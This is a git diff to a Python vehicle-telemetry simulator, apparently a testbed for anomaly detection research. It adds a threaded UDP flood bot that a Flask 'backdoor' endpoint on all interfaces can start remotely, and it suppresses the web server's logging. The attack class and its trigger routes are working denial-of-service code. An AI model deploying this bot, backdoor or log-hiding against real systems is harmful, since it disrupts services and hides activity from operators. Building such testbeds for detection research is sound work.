@@ -16,6 +16,7 @@ import os
 import requests
 import subprocess
 from flask import Flask
+import socket
 
 
 class Attack:
@@ -60,13 +61,13 @@ class Attack:
         start_time = time.time()
         self.end_time = start_time + self.duration
 
-        logger.debug(f"Starting UDP flood to {self.target_ip}:{self.target_port}")
+        logger.info(f"[BOT] Starting UDP flood to {self.target_ip}:{self.target_port}")
         if self.duration != 0:
-            logger.debug(f"Test will run for {self.duration} seconds")
+            logger.debug(f"[BOT] Test will run for {self.duration} seconds")
         else:
-            logger.debug(f"Attack will continue until stopped by user.")
+            logger.debug(f"[BOT] Attack will continue until stopped by user.")
 
-        logger.debug(f"Packet size: {self.packet_size} bytes")
+        logger.debug(f"[BOT] Packet size: {self.packet_size} bytes")
 
         try:
             self.alive = True
@@ -80,14 +81,14 @@ class Attack:
                     elapsed = time.time() - start_time
                     rate = packets_sent / elapsed if elapsed > 0 else 0
                     mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
-                    logger.info(f"Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
+                    logger.info(f"[BOT] Sent {packets_sent} packets, {bytes_sent/1000000:.2f} MB ({rate:.2f} pps, {mbps:.2f} Mbps)")
 
                 # Aggiungi un ritardo tra i pacchetti se specificato
                 if self.delay > 0:
                     time.sleep(self.delay)
 
         except Exception:
-            logger.debug("\nAttack stopped unexpectedly!")
+            logger.debug("[BOT] Attack stopped unexpectedly!")
 
         finally:
             # Chiudi il socket
@@ -98,12 +99,12 @@ class Attack:
             rate = packets_sent / elapsed if elapsed > 0 else 0
             mbps = (bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
 
-            logger.info("Attack completed")
-            logger.debug(f"Duration: {elapsed:.2f} seconds")
-            logger.debug(f"Packets sent: {packets_sent}")
-            logger.debug(f"Data sent: {bytes_sent/1000000:.2f} MB")
-            logger.debug(f"Rate: {rate:.2f} packets per second")
-            logger.debug(f"Throughput: {mbps:.2f} Mbps")
+            logger.info("[BOT] Attack completed")
+            logger.debug(f"[BOT] Duration: {elapsed:.2f} seconds")
+            logger.debug(f"[BOT] Packets sent: {packets_sent}")
+            logger.debug(f"[BOT] Data sent: {bytes_sent/1000000:.2f} MB")
+            logger.debug(f"[BOT] Rate: {rate:.2f} packets per second")
+            logger.debug(f"[BOT] Throughput: {mbps:.2f} Mbps")
 
 
 # Create a lock object
@@ -217,7 +218,7 @@ def health_probes_thread(args):
 
 
 def thread_anomalie(args):
-    global produced_anomalies
+    global produced_anomalies, attack_lock
     logger.info(f"Starting thread for anomalies generation for vehicle: {VEHICLE_NAME}")
     media_durata_anomalie = args.mu_anomalies * args.alpha
     sigma_anomalie = 1 * args.beta
@@ -256,13 +257,12 @@ def thread_anomalie(args):
         data_to_send['cluster'] = str(cluster)
 
         if mode == 'SW':
-            health_dict = train_monitor.probe_health()
-            produce_message(
-                data=health_dict, 
-                topic_name=f"{VEHICLE_NAME}_HEALTH")
-            attack_label = get_status_robust()
-            data_to_send.update(health_dict)
-            data_to_send['node_status'] = attack_label
+            with attack_lock:
+                health_dict = train_monitor.probe_health()
+                attack_label = get_status_robust()
+                data_to_send.update(health_dict)
+                data_to_send['node_status'] = attack_label
+            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
         
         produced_anomalies += 1
         produce_message(data_to_send, topic_name)
@@ -283,7 +283,7 @@ def sample_normal_from_clusters():
 
 
 def thread_normali(args):
-    global produced_diagnostics
+    global produced_diagnostics, attack_lock
     logger.info(f"Starting thread for normal data generation for vehicle: {VEHICLE_NAME}")
     media_durata_normali = args.mu_normal * args.alpha
     sigma_normali = 1 * args.beta
@@ -323,14 +323,12 @@ def thread_normali(args):
         data_to_send['cluster'] = str(cluster)
         
         if mode == 'SW':
-            health_dict = train_monitor.probe_health()
-            produce_message(
-                data=health_dict, 
-                topic_name=f"{VEHICLE_NAME}_HEALTH")
-            # attack_label = get_status_from_manager(VEHICLE_NAME)
-            attack_label = get_status_robust()
-            data_to_send.update(health_dict)
-            data_to_send['node_status'] = attack_label
+            with attack_lock:
+                health_dict = train_monitor.probe_health()
+                attack_label = get_status_robust()
+                data_to_send.update(health_dict)
+                data_to_send['node_status'] = attack_label
+            produce_message(data=health_dict, topic_name=f"{VEHICLE_NAME}_HEALTH")
 
         produce_message(data_to_send, topic_name)
         produced_diagnostics += 1
@@ -434,7 +432,7 @@ def configure_no_proxy():
 
 
 def main():
-    global VEHICLE_NAME, MANAGER_PORT, UNDER_ATTACK
+    global VEHICLE_NAME, MANAGER_PORT, UNDER_ATTACK, attack_lock
     global producer, logger, anomaly_generators, diagnostics_generators
     global anomaly_thread, diagnostics_thread, stop_threads, train_monitor, mode
 
@@ -455,9 +453,9 @@ def main():
     parser.add_argument('--mode', type=str, default='OF', help='If OF, then functional sensors are separated from health sensors. If SW, sensors are united.')
     parser.add_argument('--manager_port', type=int, default=5000, help='Port of the train manager service')
     parser.add_argument('--no_proxy_host', action='store_true', help='set the host ip among the no_proxy ips.')
-    parser.add_argument("--target_ip", help="Target IP address")
+    parser.add_argument("--target_ip", type=str, default='172.18.0.4', help="Target IP address")
     parser.add_argument("--target_port", type=int, default=80, help="Target port (default: 80)")
-    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")
+    parser.add_argument("--duration", type=int, default=0, help="Duration of the attack in seconds (default: 60)")
     parser.add_argument("--packet_size", type=int, default=1024, help="Size of each packet in bytes (default: 1024)")
     parser.add_argument("--delay", type=float, default=0.001, help="Delay between packets in seconds (default: 0.001)")
     parser.add_argument("--bot_port", type=int, default=5002, help="Backdoor port for attacks")
@@ -474,7 +472,7 @@ def main():
         configure_no_proxy()
 
     
-    logging.basicConfig(format='%(name)s - %(levelname)s - %(message)s', level=str(args.logging_level).upper())
+    logging.basicConfig(format='%(name)s-%(levelname)s-%(message)s', level=str(args.logging_level).upper())
     logger = logging.getLogger(f'[{VEHICLE_NAME}_PROD]')
     args.logger = logger
     args.vehicle_name = VEHICLE_NAME
@@ -487,6 +485,7 @@ def main():
     }
     producer = SerializingProducer(conf_prod)
 
+    attack_lock = threading.Lock()
     attack = Attack(
         target_ip=args.target_ip,
         target_port=args.target_port,
@@ -515,29 +514,35 @@ def main():
     train_monitor_thread = threading.Thread(target=health_probes_thread, args=(args,))
     anomaly_thread = threading.Thread(target=thread_anomalie, args=(vehicle_args,))
     diagnostics_thread = threading.Thread(target=thread_normali, args=(vehicle_args,))
+    attack_thread = threading.Thread(target=attack.start_attack)
 
     # Set daemon to True
     anomaly_thread.daemon = True
     diagnostics_thread.daemon = True
     train_monitor_thread.daemon = True
+    attack_thread.daemon = True
 
 
-    app = Flask(__name__)
+    app = Flask(f'{VEHICLE_NAME}_backdoor')
     @app.route('/start-attack', methods=['POST'])
     def start_attack():
         global UNDER_ATTACK
-        attack.start_attack()
-        logger.info(f"{VEHICLE_NAME} under attack")
-        UNDER_ATTACK = True
-        return 'Mitigation activated', 200
+        
+        with attack_lock:
+            attack_thread.start()
+            logger.info(f"{VEHICLE_NAME} under attack")
+            UNDER_ATTACK = True
+        return 'Attack launched', 200
     
     @app.route('/stop-attack', methods=['POST'])
     def stop_attack():
         global UNDER_ATTACK
-        attack.alive = False
-        logger.info(f"{VEHICLE_NAME} healed")
-        UNDER_ATTACK = False
-        return 'Mitigation deactivated', 200
+        with attack_lock:
+            attack.alive = False
+            attack_thread.join(1)
+            logger.info(f"{VEHICLE_NAME} healed")
+            UNDER_ATTACK = False
+        return 'Attack stopped', 200
     
     flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': args.bot_port})
     flask_thread.daemon = True
@@ -545,6 +550,9 @@ def main():
     logger.info(f"Backdoor installed at {args.bot_port}")
     flask_logger = logging.getLogger('werkzeug')
     flask_logger.name = f"[{VEHICLE_NAME}_BOT]"
+    def custom_handle(record):
+        return
+    flask_logger.handle = custom_handle
 
     # Start threads
     logger.info(f"Starting threads...")
@@ -559,6 +567,9 @@ def main():
     logger.info(f"Stopping producing threads...")
     anomaly_thread.join(1)
     diagnostics_thread.join(1)
+    if UNDER_ATTACK:
+        attack.alive = False
+        attack_thread.join(1)
     if mode == 'OF': train_monitor_thread.join(1)
     logger.info(f"Stopped producing threads.")
 
